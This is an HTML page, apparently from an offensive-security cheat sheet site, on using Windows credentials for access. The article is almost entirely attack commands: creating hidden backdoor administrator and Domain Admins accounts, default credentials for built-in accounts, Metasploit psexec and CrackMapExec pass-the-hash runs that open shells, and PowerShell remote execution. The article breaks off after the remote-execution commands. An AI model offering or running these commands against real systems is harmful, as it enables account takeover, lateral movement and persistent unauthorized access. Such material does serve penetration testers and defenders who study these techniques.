@@ -1,0 +1,1851 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Various ways to use the many various types of Windows credentials you may have access to (passing the hash, etc..). Extremely useful.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Windows - Using Credentials" />
+<meta property="og:description" content="Various ways to use the many various types of Windows credentials you may have access to (passing the hash, etc..). Extremely useful." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/windows_using_credentials/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-04T00:00:00+00:00" />
+<title>Windows - Using Credentials | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="active">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Windows - Using Credentials</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#windows---using-credentials">Windows - Using credentials</a>
+      <ul>
+        <li><a href="#tips">TIPS</a>
+          <ul>
+            <li><a href="#tip-1---create-your-credential">TIP 1 - Create your credential</a></li>
+            <li><a href="#tip-2---retail-credential">TIP 2 - Retail Credential</a></li>
+            <li><a href="#tip-3---sandbox-credential---wdagutilityaccount">TIP 3 - Sandbox Credential - WDAGUtilityAccount</a></li>
+          </ul>
+        </li>
+        <li><a href="#metasploit">Metasploit</a>
+          <ul>
+            <li><a href="#metasploit---smb">Metasploit - SMB</a></li>
+            <li><a href="#metasploit---psexec">Metasploit - Psexec</a></li>
+          </ul>
+        </li>
+        <li><a href="#crackmapexec">Crackmapexec</a></li>
+        <li><a href="#remote-code-execution-with-ps-credentials">Remote Code Execution with PS Credentials</a></li>
+        <li><a href="#winrm">WinRM</a></li>
+        <li><a href="#powershell-remoting">Powershell Remoting</a></li>
+        <li><a href="#winexe">Winexe</a></li>
+        <li><a href="#wmi">WMI</a></li>
+        <li><a href="#psexecpy--smbexecpy--wmiexecpy">Psexec.py / Smbexec.py / Wmiexec.py</a></li>
+        <li><a href="#psexec---sysinternal">PsExec - Sysinternal</a></li>
+        <li><a href="#rdp-remote-desktop-protocol">RDP Remote Desktop Protocol</a></li>
+        <li><a href="#netuse">Netuse</a></li>
+        <li><a href="#runas">Runas</a></li>
+        <li><a href="#pass-the-ticket">Pass the Ticket</a></li>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="windows---using-credentials">
+  Windows - Using credentials
+  <a class="anchor" href="#windows---using-credentials">#</a>
+</h1>
+<h2 id="tips">
+  TIPS
+  <a class="anchor" href="#tips">#</a>
+</h2>
+<h3 id="tip-1---create-your-credential">
+  TIP 1 - Create your credential
+  <a class="anchor" href="#tip-1---create-your-credential">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net user hacker Hcker_12345678* /add /Y
+</span></span><span style="display:flex;"><span>net localgroup administrators hacker /add
+</span></span><span style="display:flex;"><span>net localgroup <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> hacker /add <span style="color:#75715e"># RDP access</span>
+</span></span><span style="display:flex;"><span>net localgroup <span style="color:#e6db74">&#34;Backup Operators&#34;</span> hacker /add <span style="color:#75715e"># Full access to files</span>
+</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;Domain Admins&#34;</span> hacker /add /domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># enable a domain user account</span>
+</span></span><span style="display:flex;"><span>net user hacker /ACTIVE<span style="color:#960050;background-color:#1e0010">:</span>YES /domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent users from changing their password</span>
+</span></span><span style="display:flex;"><span>net user username /Passwordchg<span style="color:#960050;background-color:#1e0010">:</span>No
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the password to expire</span>
+</span></span><span style="display:flex;"><span>net user hacker /Expires<span style="color:#960050;background-color:#1e0010">:</span>Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create a machine account (not shown in net users)</span>
+</span></span><span style="display:flex;"><span>net user /add evilbob$ evilpassword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># homoglyph Aԁmіnistratοr (different of Administrator)</span>
+</span></span><span style="display:flex;"><span>A<span style="color:#960050;background-color:#1e0010">ԁ</span>m<span style="color:#960050;background-color:#1e0010">і</span>nistrat<span style="color:#960050;background-color:#1e0010">ο</span>r
+</span></span></code></pre></div><p>Some info about your user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net user /dom
+</span></span><span style="display:flex;"><span>net user /domain
+</span></span></code></pre></div><h3 id="tip-2---retail-credential">
+  TIP 2 - Retail Credential
+  <a class="anchor" href="#tip-2---retail-credential">#</a>
+</h3>
+<p>Retail Credential 
+  <a href="https://twitter.com/m8urnett/status/1003835660380172289">@m8urnett on Twitter</a></p>
+<p>when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Username<span style="color:#960050;background-color:#1e0010">:</span> RetailAdmin
+</span></span><span style="display:flex;"><span>Password<span style="color:#960050;background-color:#1e0010">:</span> trs10
+</span></span></code></pre></div><h3 id="tip-3---sandbox-credential---wdagutilityaccount">
+  TIP 3 - Sandbox Credential - WDAGUtilityAccount
+  <a class="anchor" href="#tip-3---sandbox-credential---wdagutilityaccount">#</a>
+</h3>
+<p>WDAGUtilityAccount - 
+  <a href="https://twitter.com/never_released/status/1081569133844676608">@never_released on Twitter</a></p>
+<p>Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>\\windowssandbox
+</span></span><span style="display:flex;"><span>Username<span style="color:#960050;background-color:#1e0010">:</span> wdagutilityaccount
+</span></span><span style="display:flex;"><span>Password<span style="color:#960050;background-color:#1e0010">:</span> pw123
+</span></span></code></pre></div><h2 id="metasploit">
+  Metasploit
+  <a class="anchor" href="#metasploit">#</a>
+</h2>
+<h3 id="metasploit---smb">
+  Metasploit - SMB
+  <a class="anchor" href="#metasploit---smb">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>use auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>smb_login  
+</span></span><span style="display:flex;"><span>set SMBDomain DOMAIN  
+</span></span><span style="display:flex;"><span>set SMBUser username
+</span></span><span style="display:flex;"><span>set SMBPass password
+</span></span><span style="display:flex;"><span>services <span style="color:#f92672">-</span>p <span style="color:#ae81ff">445</span> <span style="color:#f92672">-</span>R  
+</span></span><span style="display:flex;"><span>run
+</span></span><span style="display:flex;"><span>creds
+</span></span></code></pre></div><h3 id="metasploit---psexec">
+  Metasploit - Psexec
+  <a class="anchor" href="#metasploit---psexec">#</a>
+</h3>
+<p>Note: the password can be replaced by a hash to execute a <code>pass the hash</code> attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>use exploit<span style="color:#f92672">/</span>windows<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>psexec
+</span></span><span style="display:flex;"><span>set RHOST <span style="color:#ae81ff">10.2.0.3</span>
+</span></span><span style="display:flex;"><span>set SMBUser username
+</span></span><span style="display:flex;"><span>set SMBPass password
+</span></span><span style="display:flex;"><span>set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:<span style="color:#ae81ff">8846f</span><span style="color:#ae81ff">7</span>eaee8fb117ad06bdd830b7586c
+</span></span><span style="display:flex;"><span>set PAYLOAD windows<span style="color:#f92672">/</span>meterpreter<span style="color:#f92672">/</span>bind_tcp
+</span></span><span style="display:flex;"><span>run
+</span></span><span style="display:flex;"><span>shell
+</span></span></code></pre></div><h2 id="crackmapexec">
+  Crackmapexec
+  <a class="anchor" href="#crackmapexec">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/byt3bl33d3r/CrackMapExec.github
+</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> -x <span style="color:#e6db74">&#39;whoami&#39;</span> <span style="color:#75715e"># cmd</span>
+</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> -X <span style="color:#e6db74">&#39;whoami&#39;</span> <span style="color:#75715e"># powershell</span>
+</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> --exec-method atexec -x <span style="color:#e6db74">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> --exec-method wmiexec -x <span style="color:#e6db74">&#39;whoami&#39;</span>
+</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> --exec-method smbexec -x <span style="color:#e6db74">&#39;whoami&#39;</span>
+</span></span></code></pre></div><h2 id="remote-code-execution-with-ps-credentials">
+  Remote Code Execution with PS Credentials
+  <a class="anchor" href="#remote-code-execution-with-ps-credentials">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;secretpassword&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:\&gt; $Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;DOMAIN\USERNAME&#39;</span>, $SecPassword)
+</span></span><span style="display:flex;"><span>PS C:\&gt; Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
